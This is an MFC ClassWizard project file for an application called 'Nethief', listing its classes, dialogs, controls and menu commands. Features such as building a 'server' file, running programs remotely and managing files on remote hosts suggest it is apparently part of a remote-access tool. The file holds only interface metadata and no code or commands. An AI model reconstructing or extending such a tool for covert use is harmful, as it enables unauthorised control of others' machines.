; CLW file contains information for the MFC ClassWizard

[General Info]
Version=1
LastClass=CMainFrame
LastTemplate=CDialog
NewFileInclude1=#include "stdafx.h"
NewFileInclude2=#include "Nethief.h"
LastPage=0

ClassCount=33
Class1=CNethiefApp
Class2=CNethiefDoc
Class3=CMyFormView
Class4=CMainFrame

ResourceCount=32
Resource1=IDD_SPLASH
Resource2=IDD_WIZARD6
Class5=CAboutDlg
Resource3=IDD_TOOLBARFINDFILE
Class6=CSplashDlg
Class7=CMySplitterWnd
Resource4=IDD_COMMUNITY
Class8=CTipOfTheDayDlg
Resource5=IDD_REMARK
Class9=CMyTreeView
Class10=CMyListView
Resource6=IDD_SELECTFILEOPERATION
Resource7=IDR_POPUPMENU
Class11=CToolBarRunDlg
Resource8=IDD_ABOUTBOX
Class12=CToolBarFindFileDlg
Resource9=IDR_FILETOOLBAR
Class13=CToolBarPropertySingleDlg
Resource10=IDD_TOOLBARPROPERTY_MULTI
Class14=CToolBarPropertyMultiDlg
Resource11=IDR_CONSOLETOOLBAR
Class15=CToolBarPropertyDiskdriveDlg
Resource12=IDD_WIZARD1
Resource13=IDD_WIZARD3
Resource14=IDD_TOOLBARRUN_REMOTE
Resource15=IDR_SYSTRAYMENU
Resource16=IDD_TIPOFTHEDAY
Resource17=IDD_WIZARD5
Resource18=IDD_SELECTIP
Class16=CToolBarBuildServerDlg
Class17=CWizardPage1
Class18=CWizardPage2
Class19=CLinkStatic
Class20=CHelpUpdateDlg
Resource19=IDD_EASTEREGG
Resource20=IDD_TOOLBARPROPERTY_SINGLE
Class21=COptionDlg
Class22=CWizardPage4
Class23=CWizardPage5
Resource21=IDD_WIZARD2
Class24=CToolBarRunRemoteDlg
Resource22=IDD_HELPUPDATE
Class25=CToolBarFindFileResultDlg
Class26=CEasterEggDlg
Resource23=IDD_TOOLBARPROPERTY_DISKDRIVE
Resource24=IDD_WIZARD4
Class27=CWizardPage3
Resource25=IDR_NETTOOLBAR
Class28=CSelectIPDlg
Resource26=IDR_MAINFRAME
Resource27=IDD_OPTION
Class29=CWizardPage6
Resource28=IDD_TOOLBARBUILDSERVER
Class30=CSelectFileOperationDlg
Resource29=IDD_TOOLBARRUN
Class31=CRemarkDlg
Resource30=IDD_WIZARD31
Class32=CWizardPage31
Resource31=IDD_TOOLBARFINDFILE_RESULT
Class33=CDownloadDlg
Resource32=IDD_DOWNLOAD

[CLS:CNethiefApp]
Type=0
HeaderFile=Nethief.h
ImplementationFile=Nethief.cpp
Filter=N
LastObject=CNethiefApp

[CLS:CNethiefDoc]
Type=0
HeaderFile=NethiefDoc.h
ImplementationFile=NethiefDoc.cpp
Filter=N
LastObject=CNethiefDoc

[CLS:CMainFrame]
Type=0
HeaderFile=MainFrm.h
ImplementationFile=MainFrm.cpp
Filter=W
LastObject=CMainFrame
BaseClass=CFrameWnd
VirtualFilter=fWC

[CLS:CAboutDlg]
Type=0
HeaderFile=Nethief.cpp
ImplementationFile=Nethief.cpp
Filter=D
LastObject=CAboutDlg
BaseClass=CDialog
VirtualFilter=dWC

[DLG:IDD_ABOUTBOX]
Type=1
Class=CAboutDlg
ControlCount=14
Control1=IDC_STATIC,static,1342177283
Control2=IDC_STATIC,static,1342308352
Control3=IDC_STATIC_VERSION,static,1342308352
Control4=IDC_STATIC,static,1342308352
Control5=IDC_STATIC,static,1342308352
Control6=IDC_STATIC_DATE,static,1342308352
Control7=IDC_STATIC,static,1342308352
Control8=IDC_STATIC,static,1342308352
Control9=IDC_STATIC,static,1342308352
Control10=IDC_STATIC_HOMEPAGE,static,1342308608
Control11=IDC_STATIC,static,1342308352
Control12=IDC_STATIC_EMAIL,static,1342308608
Control13=IDC_STATIC,static,1342308352
Control14=IDOK,button,1342373889

[MNU:IDR_MAINFRAME]
Type=1
Class=CMainFrame
Command1=ID_TOOLBAR_FILEMANAGER
Command2=ID_TOOLBAR_COMMUNITY
Command3=ID_MENU_CONSOLE_LOGON
Command4=ID_APP_EXIT
Command5=ID_TOOLBAR_NEWFILE
Command6=ID_TOOLBAR_NEWFOLDER
Command7=ID_TOOLBAR_BACK
Command8=ID_TOOLBAR_REFRESH
Command9=ID_TOOLBAR_FINDFILE
Command10=ID_TOOLBAR_CUT
Command11=ID_TOOLBAR_COPY
Command12=ID_TOOLBAR_PASTE
Command13=ID_MENU_FILE_RUN
Command14=ID_TOOLBAR_RUN
Command15=ID_MENU_FILE_RENAME
Command16=ID_TOOLBAR_DELETE
Command17=ID_TOOLBAR_VIEW
Command18=ID_TOOLBAR_PROPERTY
Command19=ID_TOOLBAR_SELECTALL
Command20=ID_TOOLBAR_REVERSESELECT
Command21=ID_TOOLBAR_DELETEHOST
Command22=ID_TOOLBAR_DISCONNECT
Command23=ID_MENU_NET_UNINSTALL
Command24=ID_MENU_NET_NOTE
Command25=ID_TOOLBAR_STOP
Command26=ID_TOOLBAR_BUILDSERVER
Command27=ID_MENU_NET_DOWNLOAD
Command28=ID_MENU_NET_OPTION
Command29=ID_HELP_TIPOFTHEDAY
Command30=ID_HELP_README
Command31=ID_HELP_HOMEPAGE
Command32=ID_HELP_EMAIL
Command33=ID_HELP_UPDATE
Command34=ID_APP_ABOUT
CommandCount=34

[ACL:IDR_MAINFRAME]
Type=1
Class=CMainFrame
Command1=ID_TOOLBAR_SELECTALL
Command2=ID_TOOLBAR_DISCONNECT
Command3=ID_TOOLBAR_NEWFOLDER
Command4=ID_TOOLBAR_FINDFILE
Command5=ID_TOOLBAR_VIEW
Command6=ID_TOOLBAR_NEWFILE
Command7=ID_MENU_NET_NOTE
Command8=ID_MENU_CONSOLE_TAB
Command9=ID_TOOLBAR_RUN
Command10=ID_MENU_NET_UNINSTALL
Command11=ID_TOOLBAR_DELETE
Command12=ID_TOOLBAR_DELETE
Command13=ID_HELP_README
Command14=ID_MENU_FILE_RENAME
Command15=ID_TOOLBAR_FINDFILE
Command16=ID_TOOLBAR_REFRESH
Command17=ID_TOOLBAR_STOP
Command18=ID_TOOLBAR_BUILDSERVER
Command19=ID_MENU_NET_DOWNLOAD
Command20=ID_MENU_NET_OPTION
Command21=ID_TOOLBAR_PROPERTY
Command22=ID_APP_EXIT
CommandCount=22

[DLG:IDD_SPLASH]
Type=1
Class=CSplashDlg
ControlCount=1
Control1=IDC_STATIC,static,1342177294

[CLS:CSplashDlg]
Type=0
HeaderFile=SplashDlg.h
ImplementationFile=SplashDlg.cpp
BaseClass=CDialog
Filter=D
VirtualFilter=dWC
LastObject=CSplashDlg

[CLS:CMySplitterWnd]
Type=0
HeaderFile=MySplitterWnd.h
ImplementationFile=MySplitterWnd.cpp
BaseClass=CSplitterWnd
Filter=T
LastObject=CMySplitterWnd
VirtualFilter=pWC

[DLG:IDD_TIPOFTHEDAY]
Type=1
Class=CTipOfTheDayDlg
ControlCount=13
Control1=ID_OK,button,1342242817
Control2=IDC_BUTTON_README,button,1342242816
Control3=IDC_BUTTON_HOMEPAGE,button,1342242816
Control4=IDC_BUTTON_EMAIL,button,1342242816
Control5=IDC_BUTTON_TIPS,button,1342242816
Control6=IDC_CHECK1,button,1342242819
Control7=IDC_STATIC,static,1342177296
Control8=IDC_STATIC_LIGHT,static,1342179331
Control9=IDC_STATIC,static,1342177294
Control10=IDC_STATIC_DOYOUKNOW,static,1342308352
Control11=IDC_STATIC_TIPS,static,1342308352
Control12=IDC_STATIC,static,1342308352
Control13=IDC_STATIC_BACKGROUND,static,1342181376

[CLS:CTipOfTheDayDlg]
Type=0
HeaderFile=TipOfTheDayDlg.h
ImplementationFile=TipOfTheDayDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=ID_OK

[CLS:CMyTreeView]
Type=0
HeaderFile=MyTreeView.h
ImplementationFile=MyTreeView.cpp
BaseClass=CTreeView
Filter=C
LastObject=CMyTreeView
VirtualFilter=VWC

[CLS:CMyFormView]
Type=0
HeaderFile=MyFormView.h
ImplementationFile=MyFormView.cpp
BaseClass=CFormView
Filter=W
LastObject=CMyFormView
VirtualFilter=VWC

[CLS:CMyListView]
Type=0
HeaderFile=MyListView.h
ImplementationFile=MyListView.cpp
BaseClass=CListView
Filter=W
LastObject=CMyListView
VirtualFilter=VWC

[TB:IDR_CONSOLETOOLBAR]
Type=1
Class=?
Command1=ID_TOOLBAR_FILEMANAGER
Command2=ID_TOOLBAR_COMMUNITY
CommandCount=2

[TB:IDR_FILETOOLBAR]
Type=1
Class=?
Command1=ID_TOOLBAR_NEWFILE
Command2=ID_TOOLBAR_NEWFOLDER
Command3=ID_TOOLBAR_BACK
Command4=ID_TOOLBAR_REFRESH
Command5=ID_TOOLBAR_FINDFILE
Command6=ID_TOOLBAR_CUT
Command7=ID_TOOLBAR_COPY
Command8=ID_TOOLBAR_PASTE
Command9=ID_TOOLBAR_RUN
Command10=ID_TOOLBAR_DELETE
Command11=ID_TOOLBAR_VIEW
Command12=ID_TOOLBAR_PROPERTY
CommandCount=12

[DLG:IDD_TOOLBARRUN]
Type=1
Class=CToolBarRunDlg
ControlCount=12
Control1=IDC_STATIC,static,1342308352
Control2=IDC_EDIT1,edit,1350631552
Control3=IDC_BUTTON1,button,1342242816
Control4=IDC_STATIC,static,1342308352
Control5=IDC_EDIT2,edit,1350631552
Control6=IDC_BUTTON2,button,1342242816
Control7=IDOK,button,1342242817
Control8=IDCANCEL,button,1342242816
Control9=IDC_STATIC,static,1342177298
Control10=IDC_STATIC,static,1342177296
Control11=IDC_STATIC,static,1342177283
Control12=IDC_STATIC,static,1342177283

[CLS:CToolBarRunDlg]
Type=0
HeaderFile=ToolBarRunDlg.h
ImplementationFile=ToolBarRunDlg.cpp
BaseClass=CDialog
Filter=D
VirtualFilter=dWC
LastObject=CToolBarRunDlg

[DLG:IDD_TOOLBARFINDFILE]
Type=1
Class=CToolBarFindFileDlg
ControlCount=7
Control1=IDC_STATIC,static,1342308352
Control2=IDC_EDIT1,edit,1350631552
Control3=IDC_CHECK1,button,1342242819
Control4=IDOK,button,1342242817
Control5=IDCANCEL,button,1342242816
Control6=IDC_STATIC,static,1342177283
Control7=IDC_STATIC,static,1342177298

[CLS:CToolBarFindFileDlg]
Type=0
HeaderFile=ToolBarFindFileDlg.h
ImplementationFile=ToolBarFindFileDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CToolBarFindFileDlg
VirtualFilter=dWC

[CLS:CToolBarPropertySingleDlg]
Type=0
HeaderFile=ToolBarPropertySingleDlg.h
ImplementationFile=ToolBarPropertySingleDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CToolBarPropertySingleDlg
VirtualFilter=dWC

[CLS:CToolBarPropertyMultiDlg]
Type=0
HeaderFile=ToolBarPropertyMultiDlg.h
ImplementationFile=ToolBarPropertyMultiDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=IDC_STATIC_HOSTNAME
VirtualFilter=dWC

[CLS:CToolBarPropertyDiskdriveDlg]
Type=0
HeaderFile=ToolBarPropertyDiskdriveDlg.h
ImplementationFile=ToolBarPropertyDiskdriveDlg.cpp
BaseClass=CDialog
Filter=D
VirtualFilter=dWC
LastObject=CToolBarPropertyDiskdriveDlg

[MNU:IDR_SYSTRAYMENU]
Type=1
Class=?
Command1=ID_SYSTRAYMENU_WINDOW
Command2=ID_SYSTRAYMENU_HIDE
Command3=ID_TOOLBAR_BUILDSERVER
Command4=ID_APP_EXIT
CommandCount=4

[TB:IDR_NETTOOLBAR]
Type=1
Class=?
Command1=ID_TOOLBAR_DELETEHOST
Command2=ID_TOOLBAR_DISCONNECT
Command3=ID_TOOLBAR_STOP
Command4=ID_TOOLBAR_BUILDSERVER
CommandCount=4

[DLG:]
Type=1
Class=CWizardPage1
ControlCount=6
Control1=65535,static,1342181902
Control2=1023,static,1342177280
Control3=65535,static,1342177280
Control4=65535,static,1342177280
Control5=65535,static,1342177280
Control6=65535,static,1342177280

[DLG:IDD_WIZARD1]
Type=1
Class=CWizardPage1
ControlCount=6
Control1=IDC_STATIC,static,1342183438
Control2=IDC_STATIC,static,1342177280
Control3=IDC_STATIC,static,1342177280
Control4=IDC_STATIC,static,1342177280
Control5=IDC_STATIC,static,1342177280
Control6=IDC_STATIC,static,1342308352

[DLG:IDD_TOOLBARBUILDSERVER]
Type=1
Class=CToolBarBuildServerDlg
ControlCount=19
Control1=IDC_STATIC,static,1342308352
Control2=IDC_EDIT_KEYNAME,edit,1350631424
Control3=IDC_STATIC,static,1342308352
Control4=IDC_EDIT_FILENAME,edit,1350631424
Control5=IDC_STATIC,static,1342308352
Control6=IDC_EDIT_NOTE,edit,1350631424
Control7=IDC_STATIC,static,1342308352
Control8=IDC_EDIT_SERVERFILENAME,edit,1350631552
Control9=IDC_BUTTON_BROWSE,button,1342242816
Control10=IDC_BUTTON_BUILD,button,1342242817
Control11=IDOK,button,1342242816
Control12=IDC_STATIC,button,1342177287
Control13=IDC_STATIC,static,1342177283
Control14=IDC_STATIC,button,1342177287
Control15=IDC_STATIC,static,1342177283
Control16=IDC_STATIC,static,1342177283
Control17=IDC_STATIC,static,1342177296
Control18=IDC_STATIC,button,1342177287
Control19=IDC_STATIC,static,1342177283

[CLS:CToolBarBuildServerDlg]
Type=0
HeaderFile=toolbarbuildserverdlg.h
ImplementationFile=toolbarbuildserverdlg.cpp
BaseClass=CDialog
LastObject=IDC_BUTTON_BROWSE
Filter=D
VirtualFilter=dWC

[DLG:IDD_WIZARD2]
Type=1
Class=CWizardPage2
ControlCount=15
Control1=IDC_STATIC,static,1342183438
Control2=IDC_STATIC,static,1342177280
Control3=IDC_STATIC,static,1342177280
Control4=IDC_STATIC,static,1342308352
Control5=IDC_EDIT_ADDRESS,edit,1350631552
Control6=IDC_STATIC,static,1342308352
Control7=IDC_STATIC,static,1342308352
Control8=IDC_EDIT_USERNAME,edit,1350631552
Control9=IDC_STATIC,static,1342308352
Control10=IDC_STATIC,static,1342308352
Control11=IDC_EDIT_PASSWORD,edit,1350631584
Control12=IDC_STATIC,static,1342308352
Control13=IDC_STATIC,static,1342308352
Control14=IDC_EDIT_HOMEPAGE,edit,1350631424
Control15=IDC_STATIC,static,1342308352

[CLS:CWizardPage1]
Type=0
HeaderFile=WizardPage1.h
ImplementationFile=WizardPage1.cpp
BaseClass=CPropertyPage
Filter=D
LastObject=CWizardPage1
VirtualFilter=idWC

[CLS:CWizardPage2]
Type=0
HeaderFile=WizardPage2.h
ImplementationFile=WizardPage2.cpp
BaseClass=CPropertyPage
Filter=D
LastObject=CWizardPage2
VirtualFilter=idWC

[CLS:CLinkStatic]
Type=0
HeaderFile=LinkStatic.h
ImplementationFile=LinkStatic.cpp
BaseClass=CStatic
Filter=W
VirtualFilter=WC
LastObject=CLinkStatic

[DLG:IDD_HELPUPDATE]
Type=1
Class=CHelpUpdateDlg
ControlCount=14
Control1=IDC_STATIC,button,1342177287
Control2=IDC_STATIC,static,1342308352
Control3=IDC_STATIC_NEWVERSION,static,1342308864
Control4=IDC_STATIC,static,1342308352
Control5=IDC_STATIC_NEWDATE,static,1342308864
Control6=IDC_STATIC,button,1342177287
Control7=IDC_STATIC,static,1342308352
Control8=IDC_STATIC_VERSION,static,1342308864
Control9=IDC_STATIC,static,1342308352
Control10=IDC_STATIC_DATE,static,1342308864
Control11=IDC_STATIC,button,1342177287
Control12=IDC_STATIC_NOTE,static,1342308352
Control13=IDC_BUTTON1,button,1342242817
Control14=IDOK,button,1342242816

[CLS:CHelpUpdateDlg]
Type=0
HeaderFile=HelpUpdateDlg.h
ImplementationFile=HelpUpdateDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CHelpUpdateDlg
VirtualFilter=dWC

[DLG:IDD_WIZARD5]
Type=1
Class=CWizardPage5
ControlCount=6
Control1=IDC_BUTTON_TEST,button,1342242816
Control2=IDC_EDIT_TEST,edit,1350633540
Control3=IDC_STATIC,static,1342183438
Control4=IDC_STATIC,static,1342177280
Control5=IDC_STATIC,static,1342177280
Control6=IDC_STATIC,static,1342308352

[DLG:IDD_WIZARD4]
Type=1
Class=CWizardPage4
ControlCount=9
Control1=IDC_STATIC,static,1342183438
Control2=IDC_STATIC,static,1342177280
Control3=IDC_STATIC,static,1342177280
Control4=IDC_STATIC,static,1342308352
Control5=IDC_EDIT_PASSWORD,edit,1350631456
Control6=IDC_STATIC,static,1342308352
Control7=IDC_STATIC,static,1342308352
Control8=IDC_EDIT_PASSWORD2,edit,1350631456
Control9=IDC_STATIC,static,1342308352

[CLS:CWizardPage4]
Type=0
HeaderFile=WizardPage4.h
ImplementationFile=WizardPage4.cpp
BaseClass=CPropertyPage
Filter=D
LastObject=CWizardPage4
VirtualFilter=idWC

[CLS:CWizardPage5]
Type=0
HeaderFile=WizardPage5.h
ImplementationFile=WizardPage5.cpp
BaseClass=CPropertyPage
Filter=D
LastObject=CWizardPage5
VirtualFilter=idWC

[DLG:IDD_TOOLBARPROPERTY_SINGLE]
Type=1
Class=CToolBarPropertySingleDlg
ControlCount=24
Control1=IDOK,button,1342242817
Control2=IDCANCEL,button,1342242816
Control3=IDC_EDIT_FILENAME,edit,1342244932
Control4=IDC_STATIC_HOSTNAME,static,1342308352
Control5=IDC_STATIC_SIZE,static,1342308352
Control6=IDC_STATIC_TYPE,static,1342308352
Control7=IDC_STATIC_CTIME,static,1342308352
Control8=IDC_STATIC_MTIME,static,1342308352
Control9=IDC_STATIC_ATIME,static,1342308352
Control10=IDC_CHECK_READONLY,button,1342242819
Control11=IDC_CHECK_HIDE,button,1342242819
Control12=IDC_CHECK_ARCHIVE,button,1342242819
Control13=IDC_CHECK_SYSTEM,button,1342242819
Control14=IDC_STATIC,static,1342308352
Control15=IDC_STATIC,static,1342308352
Control16=IDC_STATIC,static,1342308352
Control17=IDC_STATIC,static,1342308352
Control18=IDC_STATIC,static,1342308352
Control19=IDC_STATIC,static,1342308352
Control20=IDC_STATIC,static,1342308352
Control21=IDC_STATIC_ICON,static,1342177283
Control22=IDC_STATIC,static,1342177296
Control23=IDC_STATIC,static,1342177296
Control24=IDC_STATIC,static,1342177296

[DLG:IDD_TOOLBARPROPERTY_MULTI]
Type=1
Class=CToolBarPropertyMultiDlg
ControlCount=8
Control1=IDOK,button,1342242817
Control2=IDC_STATIC_SIZE,static,1342308352
Control3=65535,static,1342308352
Control4=65535,static,1342308352
Control5=65535,static,1342177283
Control6=65535,static,1342177296
Control7=IDC_STATIC_STATISTIC,static,1342308352
Control8=IDC_STATIC_HOSTNAME,static,1342308352

[DLG:IDD_TOOLBARPROPERTY_DISKDRIVE]
Type=1
Class=CToolBarPropertyDiskdriveDlg
ControlCount=23
Control1=IDC_STATIC,static,1342308352
Control2=IDC_EDIT1,edit,1350631424
Control3=IDOK,button,1342242817
Control4=IDCANCEL,button,1342242816
Control5=IDC_STATIC_TYPE,static,1342308352
Control6=IDC_STATIC,static,1342308352
Control7=IDC_STATIC_ICON,static,1342177283
Control8=IDC_STATIC,static,1342177296
Control9=IDC_STATIC,static,1342177296
Control10=IDC_STATIC,static,1342177296
Control11=IDC_STATIC,static,1342308352
Control12=IDC_STATIC_SERIALNUMBER,static,1342308352
Control13=IDC_STATIC,static,1342308352
Control14=IDC_STATIC_USED,static,1342308352
Control15=IDC_STATIC_USED_PERCENT,static,1342308352
Control16=IDC_STATIC,static,1342308352
Control17=IDC_STATIC_UNUSED,static,1342308352
Control18=IDC_STATIC_UNUSED_PERCENT,static,1342308352
Control19=IDC_STATIC,static,1342308352
Control20=IDC_STATIC_TOTAL,static,1342308352
Control21=IDC_STATIC_TOTAL_PERCENT,static,1342308352
Control22=IDC_STATIC_HOSTNAME,static,1342308352
Control23=IDC_STATIC,static,1342308352

[DLG:IDD_TOOLBARRUN_REMOTE]
Type=1
Class=CToolBarRunRemoteDlg
ControlCount=9
Control1=IDC_EDIT1,edit,1350631552
Control2=IDC_COMBO1,combobox,1344339971
Control3=IDOK,button,1342242817
Control4=IDCANCEL,button,1342242816
Control5=IDC_STATIC,static,1342308352
Control6=IDC_STATIC,static,1342177298
Control7=IDC_STATIC,static,1342177283
Control8=IDC_STATIC,static,1342177283
Control9=IDC_STATIC,static,1342308352

[CLS:CToolBarRunRemoteDlg]
Type=0
HeaderFile=ToolBarRunRemoteDlg.h
ImplementationFile=ToolBarRunRemoteDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CToolBarRunRemoteDlg
VirtualFilter=dWC

[DLG:IDD_TOOLBARFINDFILE_RESULT]
Type=1
Class=CToolBarFindFileResultDlg
ControlCount=1
Control1=IDC_LIST1,SysListView32,1350631505

[CLS:CToolBarFindFileResultDlg]
Type=0
HeaderFile=ToolBarFindFileResultDlg.h
ImplementationFile=ToolBarFindFileResultDlg.cpp
BaseClass=CDialog
Filter=D
VirtualFilter=dWC
LastObject=CToolBarFindFileResultDlg

[DLG:IDD_OPTION]
Type=1
Class=COptionDlg
ControlCount=10
Control1=IDC_STATIC,button,1342177287
Control2=IDC_STATIC,static,1342177283
Control3=IDC_STATIC,static,1342308352
Control4=IDC_EDIT_VIEWERFILENAME,edit,1350631552
Control5=IDC_BUTTON_BROWSE,button,1342242816
Control6=IDC_STATIC,button,1342177287
Control7=IDC_STATIC,static,1342177283
Control8=IDC_CHECK_SELECTIP,button,1342251011
Control9=IDOK,button,1342242817
Control10=IDCANCEL,button,1342242816

[CLS:COptionDlg]
Type=0
HeaderFile=OptionDlg.h
ImplementationFile=OptionDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=COptionDlg
VirtualFilter=dWC

[DLG:IDD_EASTEREGG]
Type=1
Class=CEasterEggDlg
ControlCount=1
Control1=IDC_STATIC1,static,1342308352

[CLS:CEasterEggDlg]
Type=0
HeaderFile=EasterEggDlg.h
ImplementationFile=EasterEggDlg.cpp
BaseClass=CDialog
Filter=D
VirtualFilter=dWC
LastObject=CEasterEggDlg

[DLG:IDD_COMMUNITY]
Type=1
Class=?
ControlCount=20
Control1=IDC_EDIT_CALLBOARD,edit,1344346180
Control2=IDC_LIST1,SysListView32,1342242825
Control3=IDC_STATIC_HOSTNAME,static,1342308864
Control4=IDC_STATIC_IPADDRESS,static,1342308864
Control5=IDC_STATIC_POSITION,static,1342308864
Control6=IDC_STATIC,button,1342177287
Control7=IDC_STATIC,button,1342177287
Control8=IDC_STATIC,button,1342177287
Control9=IDC_STATIC,static,1342308352
Control10=IDC_STATIC,static,1342308352
Control11=IDC_STATIC,static,1342308352
Control12=IDC_STATIC_ONLINENUM,static,1342308864
Control13=IDC_STATIC,static,1342308352
Control14=IDC_STATIC,static,1342308352
Control15=IDC_STATIC_CHATROOM,static,1342308610
Control16=IDC_STATIC,static,1342177294
Control17=IDC_STATIC,static,1342177294
Control18=IDC_STATIC,static,1342308352
Control19=IDC_STATIC,static,1342308352
Control20=IDC_STATIC,static,1342308352

[DLG:IDD_WIZARD3]
Type=1
Class=CWizardPage3
ControlCount=15
Control1=IDC_STATIC,static,1342183438
Control2=IDC_STATIC,static,1342177280
Control3=IDC_STATIC,static,1342177280
Control4=IDC_STATIC,static,1342308352
Control5=IDC_EDIT_PATH,edit,1350631424
Control6=IDC_STATIC,static,1342308352
Control7=IDC_STATIC,static,1342308352
Control8=IDC_EDIT_FILENAME1,edit,1350631424
Control9=IDC_STATIC,static,1342308352
Control10=IDC_STATIC,static,1342308352
Control11=IDC_EDIT_FILENAME2,edit,1350631424
Control12=IDC_STATIC,static,1342308352
Control13=IDC_STATIC,static,1342308352
Control14=IDC_EDIT_FILENAME3,edit,1350631424
Control15=IDC_STATIC,static,1342308352

[CLS:CWizardPage3]
Type=0
HeaderFile=WizardPage3.h
ImplementationFile=WizardPage3.cpp
BaseClass=CPropertyPage
Filter=D
LastObject=CWizardPage3
VirtualFilter=idWC

[DLG:IDD_SELECTIP]
Type=1
Class=CSelectIPDlg
ControlCount=7
Control1=IDC_STATIC,static,1342177283
Control2=IDC_STATIC,static,1342308352
Control3=IDC_STATIC,static,1342308352
Control4=IDC_COMBO1,combobox,1344339971
Control5=IDC_STATIC,button,1342177287
Control6=IDC_STATIC,static,1342308352
Control7=IDOK,button,1342242817

[CLS:CSelectIPDlg]
Type=0
HeaderFile=SelectIPDlg.h
ImplementationFile=SelectIPDlg.cpp
BaseClass=CDialog
Filter=W
LastObject=CSelectIPDlg
VirtualFilter=dWC

[MNU:IDR_POPUPMENU]
Type=1
Class=?
Command1=ID_POPUPMENU_ADD
Command2=ID_POPUPMENU_REMARK
Command3=ID_POPUPMENU_COPY
CommandCount=3

[DLG:IDD_WIZARD6]
Type=1
Class=CWizardPage6
ControlCount=4
Control1=IDC_STATIC,static,1342183438
Control2=IDC_STATIC,static,1342177280
Control3=IDC_STATIC,static,1342177280
Control4=IDC_STATIC,static,1342177280

[CLS:CWizardPage6]
Type=0
HeaderFile=WizardPage6.h
ImplementationFile=WizardPage6.cpp
BaseClass=CPropertyPage
Filter=D
VirtualFilter=idWC
LastObject=CWizardPage6

[DLG:IDD_SELECTFILEOPERATION]
Type=1
Class=CSelectFileOperationDlg
ControlCount=12
Control1=IDC_BUTTON_OVERLAY,button,1342242817
Control2=IDC_BUTTON_CONTINUE,button,1342242816
Control3=IDCANCEL,button,1342242816
Control4=IDC_STATIC,static,1342177283
Control5=IDC_STATIC_FILENAME,static,1342308352
Control6=IDC_STATIC,static,1342308352
Control7=IDC_STATIC_SOURCEICON,static,1342177283
Control8=IDC_STATIC_SOURCEFILEINFO,static,1342308352
Control9=IDC_STATIC,static,1342308352
Control10=IDC_STATIC_DESTICON,static,1342177283
Control11=IDC_STATIC_DESTFILEINFO,static,1342308352
Control12=IDC_STATIC,static,1342308352

[CLS:CSelectFileOperationDlg]
Type=0
HeaderFile=SelectFileOperationDlg.h
ImplementationFile=SelectFileOperationDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CSelectFileOperationDlg
VirtualFilter=dWC

[DLG:IDD_REMARK]
Type=1
Class=CRemarkDlg
ControlCount=4
Control1=IDC_STATIC,static,1342308352
Control2=IDC_EDIT,edit,1350631492
Control3=IDOK,button,1342242817
Control4=IDCANCEL,button,1342242816

[CLS:CRemarkDlg]
Type=0
HeaderFile=RemarkDlg.h
ImplementationFile=RemarkDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CRemarkDlg
VirtualFilter=dWC

[DLG:IDD_WIZARD31]
Type=1
Class=CWizardPage31
ControlCount=6
Control1=65535,static,1342183438
Control2=65535,static,1342177280
Control3=65535,static,1342177280
Control4=65535,static,1342308352
Control5=IDC_EDIT_FILENAME4,edit,1350631424
Control6=65535,static,1342308352

[CLS:CWizardPage31]
Type=0
HeaderFile=WizardPage31.h
ImplementationFile=WizardPage31.cpp
BaseClass=CPropertyPage
Filter=D
LastObject=CWizardPage31
VirtualFilter=idWC

[DLG:IDD_DOWNLOAD]
Type=1
Class=CDownloadDlg
ControlCount=11
Control1=IDC_STATIC,button,1342177287
Control2=IDC_STATIC,static,1342177283
Control3=IDC_STATIC,static,1342308352
Control4=IDC_EDIT_URL,edit,1350631552
Control5=IDC_STATIC,button,1342177287
Control6=IDC_STATIC,static,1342177283
Control7=IDC_STATIC,static,1342308352
Control8=IDC_EDIT_FILENAME,edit,1350631552
Control9=IDC_BUTTON_BROWSE,button,1342242816
Control10=IDC_BUTTON_UPDATE,button,1342242817
Control11=IDOK,button,1342242816

[CLS:CDownloadDlg]
Type=0
HeaderFile=DownloadDlg.h
ImplementationFile=DownloadDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=IDC_BUTTON_UPDATE
VirtualFilter=dWC

